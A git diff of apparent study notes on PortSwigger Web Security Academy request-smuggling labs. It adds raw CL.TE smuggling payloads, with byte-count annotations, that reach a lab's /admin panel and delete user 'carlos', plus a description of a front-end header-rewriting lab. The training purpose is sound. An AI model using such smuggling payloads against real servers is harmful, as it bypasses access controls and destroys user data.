@@ -4481,19 +4481,34 @@ Response: Communication timed out. (chunked size is 5)
   - https://www.youtube.com/watch?v=XvqAbDo5DI0
     ```
     POST / HTTP/1.1
-    Host: YOUR-LAB-ID.web-security-academy.net
-    Content-length: 4
+    Host: 0a770026044f1dae82f89c9900e70040.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 4 (39\r\n)
     Transfer-Encoding: chunked
 
-    87
-   GET /admin/delete?username=carlos HTTP/1.1
-   Host: localhost
-   Content-Type: application/x-www-form-urlencoded
-   Content-Length: 15
+    39 (from GET / till content-length:6\r\n)
+    GET /admin HTTP/1.1
+    Host: localhost
+    Content-Length: 6 (add 1 byte)
 
-   x=1
-   0
+    0
+    \r\n
     ```
+    ```
+    POST / HTTP/1.1
+    Host: 0a770026044f1dae82f89c9900e70040.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 4
+    Transfer-Encoding: chunked
+
+    50
+    GET /admin/delete?username=carlos HTTP/1.1
+    Host: localhost
+    Content-Length: 6
+
+    0
+
+   ```
 - [8] Exploiting HTTP request smuggling to **reveal front-end request rewriting**
   - Info: This lab involves a front-end and back-end server, and the **front-end server doesn't support chunked encoding**. There's an admin panel at /admin, but it's only accessible to people with the IP address **127.0.0.1**. The front-end server adds an HTTP header to incoming requests containing their IP address. It's **similar to the X-Forwarded-For header** but has a different name. To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.
   - https://www.youtube.com/watch?v=gRIUDNZt_po
